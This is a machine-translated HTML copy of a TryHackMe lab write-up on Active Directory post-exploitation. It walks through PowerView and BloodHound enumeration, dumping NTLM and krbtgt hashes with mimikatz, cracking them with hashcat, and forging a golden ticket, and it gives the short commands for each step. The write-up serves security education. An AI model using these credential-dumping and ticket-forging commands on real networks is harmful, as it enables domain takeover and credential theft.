<html>
<head>
<title>Post-Exploitation Basics In Active Directory Environment By Hashar Mujahid</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Hashar Mujahid的《活动目录环境中的开发后基础》</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/post-exploitation-basics-in-active-directory-enviorment-by-hashar-mujahid-d46880974f87?source=collection_archive---------0-----------------------#2022-08-05">https://infosecwriteups.com/post-exploitation-basics-in-active-directory-enviorment-by-hashar-mujahid-d46880974f87?source=collection_archive---------0-----------------------#2022-08-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="e0b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">学习使用mimikatz、bloodhound、Powerview和msfvenom进行后期开发和维护访问的基础知识。</p><p id="c51c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">简介:</strong></p><p id="3ebb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个房间将教您在获得初始访问权限后如何在active directory环境中进行枚举。它涵盖了从使用<strong class="jp ir"> Powerview </strong>和<strong class="jp ir"> bloodhound </strong>、<strong class="jp ir">转储哈希</strong>和<strong class="jp ir">金券攻击</strong>到使用mimikatz的基本<strong class="jp ir">信息收集</strong>的所有内容。</p><p id="5ff6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">枚举w/ Powerview: </strong></p><p id="5f5d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在本任务中，我们将学习如何使用PowerView.ps1来枚举目标计算机。</p><p id="ea5c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Ssh到目标机器。</p><p id="c43e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">第一步:</strong></p><p id="6872" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您需要使用执行策略旁路来启动PowerShell。因此您可以轻松运行脚本。</p><p id="5766" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">借助“<strong class="jp ir"> -ep </strong>”标签，您可以轻松绕过这一点。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="df2d" class="ku kv iq kq b gy kw kx l ky kz">powershell -ep bypass</span></pre><p id="f6ca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您想了解更多关于PowerShell执行策略的信息，您可以观看JOHN HAMMOND的视频。</p><figure class="kl km kn ko gt la"><div class="bz fp l di"><div class="lb lc l"/></div></figure><p id="6481" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">执行下载目录中的PowerShell脚本。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi ld"><img src="../Images/9c8859f741324db805faf963cff5d302.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VU-rNoWJ9RiJRLHrxlZeCw.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">PowerView.ps1</figcaption></figure><p id="f311" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，您可以运行命令来枚举机器上的用户。</p><p id="b3bf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一个伟大的cheatsheet，以帮助您轻松列举。</p><div class="lo lp gp gr lq lr"><a href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview" rel="noopener  ugc nofollow" target="_blank"><div class="ls ab fo"><div class="lt ab lu cl cj lv"><h2 class="bd ir gy z fp lw fr fs lx fu fw ip bi translated">PowerView</h2><div class="ly l"><h3 class="bd b gy z fp lw fr fs lx fu fw dk translated">https://github . com/powershell mafia/PowerSploit/blob/dev/Recon/power view . PS1</h3></div><div class="lz l"><p class="bd b dl z fp lw fr fs lx fu fw dk translated">book.hacktricks.xyz</p></div></div><div class="ma l"><div class="mb l mc md me ma mf li lr"/></div></div></a></div><p id="b733" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过运行“Get-NetUser”命令枚举域用户。请注意，这可能会输出大量信息，并且很难解析。我们可以通过管道输出，只检索我们需要的内容，如“cn”和“description”。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi ld"><img src="../Images/390054ebc01a5a05dc20576c95964580.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7ndT4iZ1f4QjflrHBg3Qlw.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">Get-NetUser |选择cn，描述</figcaption></figure><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi ld"><img src="../Images/8505c08460d11133e56901a0da0c16dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ERlhSXK-uZOe82pemXcLnQ.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">get-net user | select Sam account name，description，pwdlastset，login count，badpwdcount #基本用户启用信息</figcaption></figure><p id="1ce6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Kerbroastable用户:</p><p id="3171" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以通过添加“-SPN”标记来找到Kerberos表用户。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi ld"><img src="../Images/b2b8159d5e604cc057d95a2ca56ce4c7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aQwpowqHV5WbjZh014_0hQ.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">users表格用户</figcaption></figure><p id="4fc3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">枚举域组:</p><p id="d43f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以通过运行“Get-NetGroup”命令来枚举域组。这样也能输出很多信息。您可以通过管道输出并检索对您有用的内容。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi ld"><img src="../Images/08c6c28150f0c1363a07ba91e28f06d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NsRh9C_GNSXL7w8i9hhw1A.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">所有组。</figcaption></figure><p id="166e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">哇哦。我们可以通过检索带有单词“admin”init的组来缩小组的范围。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi ld"><img src="../Images/e3f1b7da4452115a1faaa1d191525295.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Tev1KK9epmrHUqdxmC4c0A.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">Get-NetGroup -GroupName *admin*</figcaption></figure><p id="acce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以移到房间的下一部分，</p><p id="26c2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">枚举w/ Bloodhound: </strong></p><p id="0c02" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Bloodhound是一个图形界面，允许您直观地绘制网络地图。该工具与类似于PowerView的SharpHound一起，将用户、组、信任等。并把它们收集到。将在Bloodhound内部使用的json文件。</p><p id="e601" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将集中讨论如何收集？json文件以及如何将它们导入Bloodhound。</p><p id="5623" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">猎犬装置-</p><p id="537a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1.)<code class="fe mg mh mi kq b">apt-get install bloodhound</code></p><p id="21db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.)<code class="fe mg mh mi kq b">neo4j console</code> -默认凭证- &gt; neo4j:neo4j</p><p id="9db3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">获取战利品信息。</p><p id="35f9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，您需要绕过PowerShell的执行策略，以便可以轻松地运行脚本。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="55e5" class="ku kv iq kq b gy kw kx l ky kz">powershell -ep bypass</span></pre><p id="f8c6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在那之后，快跑吧</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="56c6" class="ku kv iq kq b gy kw kx l ky kz">. .\sharphound.ps1</span></pre><p id="884a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">之后，您需要调用bloodhound来获取所有信息</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi ld"><img src="../Images/0488b0c085e38e6fbe387787c8c36042.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N7DE8aJ1JN_jZnZEzgAeAA.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">大猎犬</figcaption></figure><p id="fc8a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您在bloodhound中遇到不兼容的收集器错误，请确保安装并运行最新版本的Sharphound.ps1。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi ld"><img src="../Images/674cd35800d1246315be1f420c34ded3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TNpwNMc0X251vEByJwNEIg.png"/></div></div></figure><p id="e4f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到我们有一个loot.zip文件，让我们将它传输到我们的攻击机器。</p><p id="c2c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用BloodHound绘制网络图-</p><p id="40fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1.)<code class="fe mg mh mi kq b">bloodhound</code>在你的攻击机器而不是受害者机器上运行这个</p><p id="bcff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.)使用您在Neo4j中设置的相同凭据登录</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi mj"><img src="../Images/2bd44c34cf8e9c5fdd69e3ed7fe74acd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zkqLKLinfQxppG4qO-5RMA.png"/></div></div></figure><p id="e244" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">之后，使用上传数据开关上传加载文件。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div class="gh gi mk"><img src="../Images/efea9a95849f7ddb4889e46494c2a639.png" data-original-src="https://miro.medium.com/v2/resize:fit:148/format:webp/1*bz-ULSS6p9thjRt0Gg4nbw.png"/></div></figure><p id="54ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">之后就可以分析输出了。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi ml"><img src="../Images/2d981f01cdc244202b8d73056d91ffbc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tJxex-vcXGoF8rImGpkG6A.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">大猎犬</figcaption></figure><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi mm"><img src="../Images/6e8f6fde9596db5106a767b4c3df81ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*H-9TN1A_KslgKmGyySS3Bg.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">Kerbrostable用户</figcaption></figure><p id="1a8b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开始下一部分。</p><p id="12fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">转储哈希w/ mimikatz: </strong></p><p id="9afc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Mimikatz是一个非常流行和强大的后利用工具，主要用于将用户凭证转储到活动目录网络中</p><p id="4236" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将重点关注用mimikatz转储NTLM散列，然后用hashcat破解这些散列。</p><p id="9058" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第一步:运行mimikatz:</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi ld"><img src="../Images/a0dc0036af7f393e48d63b08a0196054.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*a5zxohR4-o7prrDk63Y-lA.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">mimikatz.exe</figcaption></figure><p id="e334" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第2步:<code class="fe mg mh mi kq b">privilege::debug</code>确保输出是“Privilege ' 20 ' ok”——这确保您以管理员身份运行mimikatz如果不以管理员身份运行mimikatz，mimikatz将无法正常运行</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi ld"><img src="../Images/060cfa7ecce3680db738fd290906b229.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Rb-GOo279M-_blZlAU7utQ.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">特权</figcaption></figure><p id="56c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">步骤3: <code class="fe mg mh mi kq b">lsadump::lsa /patch</code>从SAM文件中转储哈希值。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi ld"><img src="../Images/8e9d01b3a46289311ee508b6a887ded5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OjmYOXmuDIPrnH--V1-2BA.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">Lsa转储</figcaption></figure><p id="8fe2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在复制这些散列，并尝试通过hashcat来破解它们。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="d8db" class="ku kv iq kq b gy kw kx l ky kz">SYNTAX</span><span id="b6d7" class="ku kv iq kq b gy mn kx l ky kz">hashcat -m 1000 &lt;hash&gt; rockyou.txt</span></pre></div><div class="ab cl mo mp hu mq" role="separator"><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt"/></div><div class="ij ik il im in"><p id="839a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">金票攻击w/ mimikatz: </strong></p><p id="31c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">成功的金券攻击使黑客能够访问组织的整个Active Directory域。</p><p id="90b5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">金券攻击利用了Kerberos身份验证协议中的一个漏洞，自Windows 2000以来，Microsoft一直将Kerberos身份验证协议用作其默认身份验证协议。</p><p id="5f55" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你想了解更多关于金券攻击的工作原理，这里有一个很棒的博客。</p><div class="lo lp gp gr lq lr"><a href="https://blog.quest.com/golden-ticket-attacks-how-they-work-and-how-to-defend-against-them/" rel="noopener  ugc nofollow" target="_blank"><div class="ls ab fo"><div class="lt ab lu cl cj lv"><h2 class="bd ir gy z fp lw fr fs lx fu fw ip bi translated">金券攻击:它们如何工作-以及如何防御它们</h2><div class="ly l"><h3 class="bd b gy z fp lw fr fs lx fu fw dk translated">“金票攻击”是一个特别丰富多彩(如果你原谅这个双关语)的名字，用来形容一次特别危险的攻击…</h3></div><div class="lz l"><p class="bd b dl z fp lw fr fs lx fu fw dk translated">blog.quest.com</p></div></div><div class="ma l"><div class="mv l mc md me ma mf li lr"/></div></div></a></div><p id="332f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">总之，黑客绕过KDC，自己创建TGT来访问各种资源。</p><p id="833a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这种攻击要成功需要一些条件。</p><blockquote class="mw mx my"><p id="2b84" class="jn jo mz jp b jq jr js jt ju jv jw jx na jz ka kb nb kd ke kf nc kh ki kj kk ij bi translated">完全限定的域名。</p><p id="5420" class="jn jo mz jp b jq jr js jt ju jv jw jx na jz ka kb nb kd ke kf nc kh ki kj kk ij bi translated">域的SID(安全标识符)。</p><p id="5d8c" class="jn jo mz jp b jq jr js jt ju jv jw jx na jz ka kb nb kd ke kf nc kh ki kj kk ij bi translated">他们想要模拟的帐户的用户名。</p><p id="0280" class="jn jo mz jp b jq jr js jt ju jv jw jx na jz ka kb nb kd ke kf nc kh ki kj kk ij bi translated">KRBTGT密码哈希。</p></blockquote><p id="9402" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">步骤1:转储krbtgt散列</p><p id="9251" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以使用mimikatz来检索krbtgt帐户的散列和安全标识符(SID)。</p><p id="135e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mg mh mi kq b">lsadump::lsa /inject /name:krbtgt</code>这将转储Kerberos票据授予票据帐户的散列和安全标识符，从而允许您创建黄金票据。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi nd"><img src="../Images/af1efa0bfefd0eb767fc6b4e947f14c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*s_maA8i0eZ_jXFiEzhpHlg.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">KRBTGT哈希转储</figcaption></figure><p id="065c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意图片中粗体显示的信息。</p><p id="a417" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第二步:创建金券:</p><p id="409d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以很容易地使用mimikatz创建一个金券。整个过程的详细演练在</p><div class="lo lp gp gr lq lr"><a href="https://pentestlab.blog/2018/04/09/golden-ticket/" rel="noopener  ugc nofollow" target="_blank"><div class="ls ab fo"><div class="lt ab lu cl cj lv"><h2 class="bd ir gy z fp lw fr fs lx fu fw ip bi translated">黄金门票</h2><div class="ly l"><h3 class="bd b gy z fp lw fr fs lx fu fw dk translated">当顾问获得域管理员访问权时，网络渗透测试通常会停止。然而…</h3></div><div class="lz l"><p class="bd b dl z fp lw fr fs lx fu fw dk translated">pentestlab.blog</p></div></div><div class="ma l"><div class="ne l mc md me ma mf li lr"/></div></div></a></div><p id="b6e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">总之，在收集了您需要运行的先决条件之后</p><p id="cb9c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mg mh mi kq b">kerberos::golden /user: /domain: /sid: /krbtgt: /id:</code>命令。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi nd"><img src="../Images/0e9ed30dbd27e42c16b589bb1c900c5c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aTf-5pxbMXLTxHZhLj4lsw.png"/></div></div></figure><p id="223a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意:您可能需要将"/Krbtgt:"改为"/rc4:"。如果您遇到任何错误，请遵循此官方指南。</p><div class="lo lp gp gr lq lr"><a href="https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html" rel="noopener  ugc nofollow" target="_blank"><div class="ls ab fo"><div class="lt ab lu cl cj lv"><h2 class="bd ir gy z fp lw fr fs lx fu fw ip bi translated">Mimikatz 2.0 -黄金门票漫游-项目-海浪之下</h2><div class="ly l"><h3 class="bd b gy z fp lw fr fs lx fu fw dk translated">米米卡茨2.0 -黄金门票演练本林肯目录黄金门票基础知识的内部工作…</h3></div><div class="lz l"><p class="bd b dl z fp lw fr fs lx fu fw dk translated">www.beneaththewaves.net</p></div></div><div class="ma l"><div class="nf l mc md me ma mf li lr"/></div></div></a></div><p id="21b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第三步:使用金券访问另一台机器:</p><p id="8850" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mg mh mi kq b">misc::cmd</code> -这将打开一个新的命令提示符，并提升所有机器的权限。</p><p id="2e37" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问其他机器！—您现在将有另一个命令提示符，可以访问网络上的所有其他计算机</p><p id="dcbd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不幸的是，因为tryhackme目前不支持网络，您将无法访问其他机器，但是我鼓励您自己将其他机器添加到该域控制器并尝试这些攻击。</p></div><div class="ab cl mo mp hu mq" role="separator"><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt"/></div><div class="ij ik il im in"><p id="c0dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">枚举w/服务器管理器:</strong></p><p id="7589" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在此任务中，我们将使用windows内置的服务器管理器来获取信息。</p><p id="98c3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为服务器在维护之前很少登录，所以您可以使用简单的内置Windows函数(如服务器管理器)轻松枚举它们。如果您已经有了域管理员，您就有了对服务器管理器的大量访问权限，以便更改信任关系、添加或删除用户、查看组，这可以作为一个入口点来查找域网络上能够访问其他网络的其他用户，以便转到另一个网络并继续您的测试。</p><p id="7343" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问服务器管理的唯一方法是rdp到它，并通过rdp连接连接到它。</p><p id="92ac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在linux中，可以使用xfreerdp连接到目标。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="0a96" class="ku kv iq kq b gy kw kx l ky kz">xfreerdp /v:&lt;IP-ADD&gt; /u:Administrator /p:'P@$$W0rd'</span></pre><p id="7813" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当您第一次启动Windows服务器管理器时，它将显示如下。最有趣的选项卡是工具和管理选项卡。“工具”选项卡包含您的大部分信息，如用户、组、信任和机器。管理页面将允许您添加职责和功能，但这很可能会很快被系统管理员注意到。</p><p id="6aad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不要关心AD CS、AD DS、DNS或文件和存储服务；这些是为active directory开发而设计的，对后期开发并不真正有用。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi ng"><img src="../Images/82f64b4ed59cc4e040fdd1712c8bf29a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*F8iNQkSvTpbbBUeo9TixXQ.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">服务器管理器用户界面</figcaption></figure><p id="c734" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">导航到工具选项卡，选择Active Directory用户和计算机。</p><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi nh"><img src="../Images/214351e237f91ccd8a391818882e0a7d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1LBVDwBYDONmZUCwKrIMzg.png"/></div></div></figure><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div class="gh gi ni"><img src="../Images/d9d7287a3051c78d2e2c6e219443af68.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gjTbsJEUtP-5KlUdS1za_w.png"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">Active Directory用户和计算机</figcaption></figure><figure class="kl km kn ko gt la gh gi paragraph-image"><div role="button" tabindex="0" class="le lf di lg bf lh"><div 